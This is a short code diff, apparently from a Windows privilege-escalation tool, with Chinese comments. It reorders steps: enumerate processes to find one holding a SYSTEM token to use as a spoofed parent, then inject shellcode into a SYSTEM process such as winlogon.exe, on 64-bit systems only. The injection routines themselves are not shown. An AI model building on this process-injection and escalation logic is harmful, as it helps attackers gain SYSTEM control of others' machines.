@@ -602,7 +602,13 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 
-		//2. 注入会话层system进程（需要相同架构的程序 x64-x64）。  session = 7 
+		//2. 枚举进程信息,通过token信息中的权限字段寻找SYSTEM权限进程，将该进程设置为父进程(x86和x64通用)。
+		if (!enumprocess()) {
+			return 0;
+		}
+
+
+		//3. 注入会话层 system 进程（需要相同架构的程序 x64-x64）。  
 		char* TarPorcess;
 		if ((int)argc == 2) {
 			TarPorcess = argv[1];
@@ -610,14 +616,20 @@ int main(int argc, char* argv[])
 		else {
 			TarPorcess = "winlogon.exe";
 		}
-		if (!InjectSYSTEM(TarPorcess)) {
-			return 0;
-		}
 
-		//3. 枚举进程信息,通过token信息中的权限字段寻找SYSTEM权限进程，将该进程设置为父进程(x86和x64通用)。
-		if (!enumprocess()) {
-			return 0;
+		SYSTEM_INFO info;
+		GetNativeSystemInfo(&info);
+		if (info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
+			// It's a 64-bit OS
+			if (!InjectSYSTEM(TarPorcess)) {
+				return 0;
+			}
+		}
+		else {
+			// 32位 shellcode还没准备好，先忽略32位系统的注入
+			printf("[-] x86 OS");
 		}
 	}
+
 	return 0;
 }
